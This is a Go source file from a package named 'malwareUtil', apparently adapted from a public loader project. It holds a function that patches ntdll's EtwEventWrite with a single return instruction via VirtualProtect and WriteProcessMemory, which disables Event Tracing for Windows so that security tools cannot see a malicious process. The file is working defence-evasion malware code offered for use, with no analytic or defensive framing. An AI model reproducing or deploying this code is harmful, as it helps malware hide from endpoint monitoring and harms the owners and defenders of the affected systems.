package malwareUtil

import (
	"golang.org/x/sys/windows"
	"unsafe"
)

//https://raw.githubusercontent.com/timwhitez/Doge-Assembly/main/loader/etw.go

var (
	fntdll             = windows.NewLazyDLL("ntdll.dll")
	fucketw            = fntdll.NewProc("EtwEventWrite")
	k32                = windows.NewLazyDLL("kernel32.dll")
	WriteProcessMemory = k32.NewProc("WriteProcessMemory")
)

func Etw(hProcess uintptr) {
	var oldProtect uint32
	var patch = []byte{0xc3}

	e := windows.VirtualProtect(fucketw.Addr(), 1, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if e != nil {
		return
	}

	WriteProcessMemory.Call(hProcess, fucketw.Addr(), uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)

	e = windows.VirtualProtect(fucketw.Addr(), 1, oldProtect, &oldProtect)
	if e != nil {
		return
	}
	return
}
